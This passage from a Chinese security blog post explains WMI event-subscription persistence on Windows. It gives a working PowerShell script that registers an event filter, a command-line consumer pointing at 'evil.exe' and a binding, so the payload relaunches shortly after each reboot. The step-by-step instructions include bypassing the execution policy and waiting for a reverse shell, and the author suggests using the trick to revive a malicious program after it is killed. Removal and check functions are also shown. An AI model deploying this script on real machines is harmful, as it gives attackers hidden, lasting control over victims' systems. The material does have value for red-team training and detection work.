
<ul>
<li><p>__InstanceDeletionEvent：实例删除/关闭事件</p>
</li>
<li><p>__InstanceModificationEvent：实例修改事件</p>
</li>
<li><p>更多类型的事件类可以查看：<a target="_blank" rel="external nofollow noopener noreferrer" href="https://docs.microsoft.com/zh-cn/windows/win32/wmisdk/--instancecreationevent">https://docs.microsoft.com/zh-cn/windows/win32/wmisdk/–instancecreationevent</a></p>
</li>
</ul>
<h4 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h4><ul>
<li>利用方式一：给刚刚我们构造的查询语句加上动作，当打开记事本时打开计算器。</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Register<span class="operator">-</span>WmiEvent <span class="operator">-</span>Query </span><br><span class="line">&quot;SELECT * FROM __InstanceDeletionEvent within 1 </span><br><span class="line">WHERE TargetInstance ISA &#x27;Win32_Process&#x27; and TargetInstance.Name = &#x27;notepad.exe&#x27;&quot; </span><br><span class="line">-Action&#123;cmd.exe /c calc.exe&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>演示效果：<a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.yuque.com/attachments/yuque/0/2021/gif/1543119/1629809973555-bb7ab51f-89b6-490f-8723-be0300fc191f.gif?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2021/gif/1543119/1629809973555-bb7ab51f-89b6-490f-8723-be0300fc191f.gif%22,%22name%22:%222021-08-24%2020.57.09.gif%22,%22size%22:4321786,%22type%22:%22image/gif%22,%22ext%22:%22gif%22,%22status%22:%22done%22,%22taskId%22:%22u271e45b4-9d82-4e93-8fc4-777b060fbfc%22,%22taskType%22:%22upload%22,%22id%22:%22ubf20aeef%22,%22card%22:%22file%22%7D">2021-08-24 20.57.09.gif</a></p>
</blockquote>
<img title src="/img/loading.gif" data-lazy-src="https://cdn.nlark.com/yuque/0/2021/png/1543119/1629809892400-1fdbf535-189d-46fe-9a30-4d429acaf067.png#clientId=u1b97252b-eaf7-4&from=paste&height=565&id=u2b4c5683&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1784&originWidth=2632&originalType=binary&ratio=1&size=1000187&status=done&style=shadow&taskId=u86fc1ca9-8cd4-4e1e-85e4-3c673b4c97e&width=833.9971313476562" alt="image.png" width="595" data-align="center">

<p>        我们可以思维扩展一下，如果说我们的恶意程序不想被关闭，那么只要设置监控关闭的事件，若监测到恶意程序被关闭则通过Action动作再启动一个。经过测试后，发现执行该命令后cmd窗口不能被关闭，否则监控被关闭。那么就引发一思考，这个查询命令必须在后台执行。</p>
<ul>
<li>利用方式二：通过Powershell脚本的方式实现真正的持久化操作。实现的方法理解后非常简单，非常像策略路由，我们首先需要通过一个过滤器来抓取我们的感兴趣“动作”，在创建一个“行为”来执行匹配了这个动作后的操作，最后将我们的定义的动作和行为进行绑定就可以实现持久化的操作。</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义一种方法：</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Install-Persistence</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 声名几个变量，第一个是通过filter筛选出“感兴趣”的动作，比如打开记事本、用户登陆等。</span></span><br><span class="line"><span class="variable">$EventFilterName</span>=<span class="string">&#x27;DMFilter&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二个是“命中后执行的行为”。</span></span><br><span class="line"><span class="variable">$EventConsumerName</span>=<span class="string">&#x27;DMConsumer&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第三个是行为的具体动作，比如这边的执行一个程序。</span></span><br><span class="line"><span class="variable">$finalPayload</span>=<span class="string">&#x27;C:\Windows\System32\evil.exe&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个参数列表，这个列表中的参数会传递给过滤器使用，包括：要查询的方式、查询的命名空间、查询器的名称以及查询的语句</span></span><br><span class="line"><span class="variable">$EventFilterArgs</span> = <span class="selector-tag">@</span>&#123;</span><br><span class="line">    EventNamespace = <span class="string">&#x27;root/cimv2&#x27;</span></span><br><span class="line">    Name = <span class="variable">$EventFilterName</span></span><br><span class="line">    <span class="comment"># SystemUpTime参数反馈系统启动至今所经过的时间，单位为1S。</span></span><br><span class="line">    <span class="comment"># 也就是说下面的查询语句，若系统启动2分钟至3分钟这个时间段，会触发一次行为的执行。</span></span><br><span class="line">    Query = <span class="string">&quot;SELECT * FROM __InstanceModificationEvent WITHIN 50 WHERE TargetInstance ISA &#x27;Win32_PerfFormattedData_PerfOS_System&#x27; AND TargetInstance.SystemUpTime &gt;= 120 AND TargetInstance.SystemUpTime &lt; 180&quot;</span></span><br><span class="line">    QueryLanguage = <span class="string">&#x27;WQL&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在订阅NameSpace中应用过滤器</span></span><br><span class="line"><span class="variable">$Filter</span> = <span class="built_in">Set-WmiInstance</span> <span class="literal">-Namespace</span> root/subscription <span class="literal">-Class</span> __EventFilter <span class="literal">-Arguments</span> <span class="variable">$EventFilterArgs</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义动作的参数</span></span><br><span class="line"><span class="variable">$CommandLineConsumerArgs</span> = <span class="selector-tag">@</span>&#123;</span><br><span class="line">    Name = <span class="variable">$EventConsumerName</span></span><br><span class="line">    CommandLineTemplate = <span class="variable">$finalPayload</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在订阅NameSpace中应用“动作”</span></span><br><span class="line"><span class="variable">$Consumer</span> = <span class="built_in">Set-WmiInstance</span> <span class="literal">-Namespace</span> root/subscription <span class="literal">-Class</span> CommandLineEventConsumer <span class="literal">-Arguments</span> <span class="variable">$CommandLineConsumerArgs</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将行为和动作进行关联</span></span><br><span class="line"><span class="variable">$FilterToConsumerArgs</span> = <span class="selector-tag">@</span>&#123;</span><br><span class="line">    <span class="keyword">Filter</span> = <span class="variable">$Filter</span></span><br><span class="line">    Consumer = <span class="variable">$Consumer</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将关联的行为和动作应用至订阅NameSpace</span></span><br><span class="line"><span class="variable">$FilterToConsumerBinding</span> = <span class="built_in">Set-WmiInstance</span> <span class="literal">-Namespace</span> root/subscription <span class="literal">-Class</span> __FilterToConsumerBinding <span class="literal">-Arguments</span> <span class="variable">$FilterToConsumerArgs</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 移除WMI持久化</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Remove-Persistence</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$EventFilterName</span> = <span class="string">&#x27;DMFilter&#x27;</span> </span><br><span class="line"><span class="variable">$EventConsumerName</span> = <span class="string">&#x27;DMConsumer&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$EventConsumerToCleanup</span> = <span class="built_in">Get-WmiObject</span> <span class="literal">-Namespace</span> root/subscription <span class="literal">-Class</span> CommandLineEventConsumer <span class="literal">-Filter</span> <span class="string">&quot;Name = &#x27;<span class="variable">$EventConsumerName</span>&#x27;&quot;</span></span><br><span class="line"><span class="variable">$EventFilterToCleanup</span> = <span class="built_in">Get-WmiObject</span> <span class="literal">-Namespace</span> root/subscription <span class="literal">-Class</span> __EventFilter <span class="literal">-Filter</span> <span class="string">&quot;Name = &#x27;<span class="variable">$EventFilterName</span>&#x27;&quot;</span></span><br><span class="line"><span class="variable">$FilterConsumerBindingToCleanup</span> = <span class="built_in">Get-WmiObject</span> <span class="literal">-Namespace</span> root/subscription <span class="literal">-Query</span> <span class="string">&quot;REFERENCES OF &#123;<span class="variable">$</span>(<span class="variable">$EventConsumerToCleanup</span>.__RELPATH)&#125; WHERE ResultClass = __FilterToConsumerBinding&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$FilterConsumerBindingToCleanup</span> | <span class="built_in">Remove-WmiObject</span></span><br><span class="line"><span class="variable">$EventConsumerToCleanup</span> | <span class="built_in">Remove-WmiObject</span></span><br><span class="line"><span class="variable">$EventFilterToCleanup</span> | <span class="built_in">Remove-WmiObject</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检查各个模块是否安装，可有可无</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check-WMI</span></span>&#123; </span><br><span class="line"></span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">&quot;Showing All Root Event Filters&quot;</span></span><br><span class="line"><span class="built_in">Get-WmiObject</span> <span class="literal">-Namespace</span> root/subscription <span class="literal">-Class</span> __EventFilter</span><br><span class="line"></span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">&quot;Showing All CommandLine Event Consumers&quot;</span></span><br><span class="line"><span class="built_in">Get-WmiObject</span> <span class="literal">-Namespace</span> root/subscription <span class="literal">-Class</span> CommandLineEventConsumer</span><br><span class="line"></span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">&quot;Showing All Filter to Consumer Bindings&quot;</span></span><br><span class="line"><span class="built_in">Get-WmiObject</span> <span class="literal">-Namespace</span> root/subscription <span class="literal">-Class</span> __FilterToConsumerBinding</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>步骤一：开启powershell脚本执行功能，注意使用system32权限的powershell执行命令，<code>Set-ExecutionPolicy -ExecutionPolicy Bypass</code></p>
</li>
<li><p>步骤二：将上面的代码合并后，重命名为”.PS1”后缀，通过命令<code>Import-Module .\&lt;Name&gt;.ps1</code> 导入脚本。</p>
</li>
<li><p>步骤三：安装持久化模块<code>Install-Persistence</code></p>
</li>
</ul>
<img title src="/img/loading.gif" data-lazy-src="https://cdn.nlark.com/yuque/0/2021/png/1543119/1629939582072-0e07633d-b7f6-4b46-b5f2-ac2885b3f448.png#clientId=ub65ac8c8-ed88-4&from=paste&height=207&id=u29bca5f3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=498&originWidth=1428&originalType=binary&ratio=1&size=224631&status=done&style=none&taskId=u6f4bfdf2-3767-4a83-8647-8efb16243ba&width=593" alt="image.png" width="554" data-align="center">

<ul>
<li>步骤四：重启系统，等待170S左右反弹shell。注意不要忘记自己的恶意程序evil.exe要放到指定的目录下。<ul>
<li>你可以通过以下powershell命令来查看当前系统启动的时间。</li>
</ul>
</li>
</ul>
<p><code>Get-WmiObject -Query &quot;Select SystemUpTime  from Win32_PerfFormattedData_PerfOS_System&quot;</code></p>
<blockquote>
<p>演示效果：这里为了更好的体现出效果，我将动作改为打开Notepad后反弹shell。<a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.yuque.com/attachments/yuque/0/2021/gif/1543119/1629941419306-eb85e596-c0a2-4fda-b962-c60b5aa2e441.gif?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2021/gif/1543119/1629941419306-eb85e596-c0a2-4fda-b962-c60b5aa2e441.gif%22,%22name%22:%222021-08-26%2009.26.52.gif%22,%22size%22:14332923,%22type%22:%22image/gif%22,%22ext%22:%22gif%22,%22status%22:%22done%22,%22taskId%22:%22uf1828d4a-5f2e-46f3-8d84-a8e53170b8f%22,%22taskType%22:%22upload%22,%22id%22:%22u6cec23a4%22,%22card%22:%22file%22%7D">2021-08-26 09.26.52.gif</a></p>
</blockquote>
<img title src="/img/loading.gif" data-lazy-src="https://cdn.nlark.com/yuque/0/2021/png/1543119/1629941423881-8be261b8-7c26-42c3-a423-81c04015ab95.png#clientId=ub65ac8c8-ed88-4&from=paste&height=615&id=uf77911b1&margin=%5Bobject%20Object%5D&name=image.png&originHeight=2628&originWidth=5116&originalType=binary&ratio=1&size=1268040&status=done&style=shadow&taskId=u0e53dc32-9d91-457e-bc0e-a636a1ecb11&width=1198" alt="image.png" width="558" data-align="center">
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined" rel="external nofollow noopener noreferrer" target="_blank">DeepMountains</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://deepmountains.cn/2022/10/02/3.%20Windows%20Management%20Instrumentation%20Event%20Subscription/">http://deepmountains.cn/2022/10/02/3.%20Windows%20Management%20Instrumentation%20Event%20Subscription/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="external nofollow noopener noreferrer">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://deepmountains.cn" target="_blank">DeepMountains</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/T1546/">T1546</a></div><div class="post_share"><div class="social-share" data-image="https://raw.githubusercontent.com/DeepMountains/DeepMountains.github.io/master/img/blog_img/att%26ck/bash.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/10/02/1.%20Change%20Default-File%20Association/"><img class="next-cover" data-lazy-src="https://raw.githubusercontent.com/DeepMountains/DeepMountains.github.io/master/img/blog_img/att%26ck/bash.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">1. Change Default File Association</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/10/02/1. Change Default-File Association/" title="1. Change Default File Association"><img class="cover" data-lazy-src="https://raw.githubusercontent.com/DeepMountains/DeepMountains.github.io/master/img/blog_img/att%26ck/bash.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-02</div><div class="title">1. Change Default File Association</div></div></a></div><div><a href="/2022/10/02/2. Screensaver/" title="2. Screensaver"><img class="cover" data-lazy-src="https://raw.githubusercontent.com/DeepMountains/DeepMountains.github.io/master/img/blog_img/att%26ck/bash.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-02</div><div class="title">2. Screensaver</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" data-lazy-src="/img/Avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"><div class="author-info__name">DeepMountains</div><div class="author-info__description">一名网络安全行业的从业者</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">24</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">我起了，一个CVE日穿了，还有什么好说的啊！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#WMI%E7%9A%84%E8%B5%B7%E6%BA%90"><span class="toc-number">1.</span> <span class="toc-text">WMI的起源</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9D%E8%AF%86WMI"><span class="toc-number">2.</span> <span class="toc-text">初识WMI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WMI%E7%BB%93%E6%9E%84%E4%BD%93%E7%B3%BB"><span class="toc-number">3.</span> <span class="toc-text">WMI结构体系</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%98%E7%AE%A1%E7%BB%84%E4%BB%B6"><span class="toc-number">3.1.</span> <span class="toc-text">托管组件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-WMI%E6%95%B0%E6%8D%AE"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 WMI数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4"><span class="toc-number">3.3.</span> <span class="toc-text">命名空间</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WMI-Event-Subscription%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">4.</span> <span class="toc-text">WMI Event Subscription权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="toc-number">4.1.</span> <span class="toc-text">利用原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%AD%A5%E9%AA%A4"><span class="toc-number">4.2.</span> <span class="toc-text">利用步骤</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/10/02/3.%20Windows%20Management%20Instrumentation%20Event%20Subscription/" title="3. Windows Management Instrumentation Event Subscription">3. Windows Management Instrumentation Event Subscription</a><time datetime="2022-10-02T07:17:01.000Z" title="发表于 2022-10-02 15:17:01">2022-10-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/10/02/1.%20Change%20Default-File%20Association/" title="1. Change Default File Association">1. Change Default File Association</a><time datetime="2022-10-02T06:05:31.000Z" title="发表于 2022-10-02 14:05:31">2022-10-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/10/02/2.%20Screensaver/" title="2. Screensaver">2. Screensaver</a><time datetime="2022-10-02T06:05:31.000Z" title="发表于 2022-10-02 14:05:31">2022-10-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/10/02/4.%20%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80/" title="4. 物理地址">4. 物理地址</a><time datetime="2022-10-02T03:59:32.000Z" title="发表于 2022-10-02 11:59:32">2022-10-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/10/02/3.%20%E5%AF%84%E5%AD%98%E5%99%A8/" title="3. 寄存器">3. 寄存器</a><time datetime="2022-10-01T22:36:13.000Z" title="发表于 2022-10-02 06:36:13">2022-10-02</time></div></div></div></div></div></div></main><footer id="footer" style="background-color: transparent;"><div id="footer-wrap"></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>if (document.getElementsByClassName('mermaid').length) {
  if (window.mermaidJsLoad) mermaid.init()
  else {
    getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(() => {
      window.mermaidJsLoad = true
      mermaid.initialize({
        theme: 'default',
      })
      false && mermaid.init()
    })
  }
}</script></div><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="true" data-text="尊严只在剑锋之上,真理只在射程之内,君子要聪明不露 才华不逞 才有肩鸿任钜的力量,纵有疾风起,人生不言弃,仗剑天涯 御风行 极目远岚平,饮马江湖 步流星 青史留英名,生如蝼蚁 当立鸿鹄之志,命如纸薄 应有不屈之心" data-fontsize="15px" data-random="false" async="async"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":280,"height":350},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>